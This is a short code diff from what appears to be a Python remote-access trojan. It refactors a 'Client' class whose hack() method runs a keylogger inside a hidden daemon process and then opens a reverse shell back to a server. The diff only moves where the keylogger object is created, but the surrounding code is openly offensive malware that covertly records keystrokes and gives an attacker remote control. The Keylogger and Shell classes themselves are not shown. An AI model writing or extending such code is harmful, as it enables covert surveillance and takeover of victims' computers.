@@ -34,6 +34,10 @@ class Client:
         # Create shell instance
         self.shell = Shell(self.sock)
         
+        # Create keylogger instance
+        self.keylogger = Keylogger(self.filename)
+        
+        
 
     def hack(self) -> None:
         """
@@ -43,15 +47,15 @@ class Client:
         """
         
         # --------------------------KEYLOGGER--------------------------#
-        keylogger = Keylogger(self.filename)
-        keylogger.setup()
         
         # Start handler and make the proccess hidden
         with daemon.DaemonContext(files_preserve=[logging.getLogger().handlers[0].stream]):
             # Start keylogger
-            keylogger.start_logging()
+            self.keylogger.setup()
+            self.keylogger.start_logging()
         
-        # --------------------------REV SHELL--------------------------# 
+        # --------------------------REV SHELL--------------------------#
+         
         # Get a reverse shell back to server
         try:
             self.shell.get_shell()
